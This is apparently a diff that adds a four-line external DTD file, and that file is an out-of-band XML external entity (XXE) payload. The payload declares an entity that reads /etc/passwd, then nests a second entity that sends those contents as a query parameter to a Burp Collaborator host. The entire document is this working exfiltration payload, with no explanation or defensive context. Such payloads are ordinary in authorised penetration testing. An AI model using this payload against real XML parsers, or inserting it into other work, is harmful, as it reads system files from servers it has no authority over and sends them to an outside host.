@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://5jpge2enxmdpk2yj7bzw3lu2ttzlna.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfiltrate;
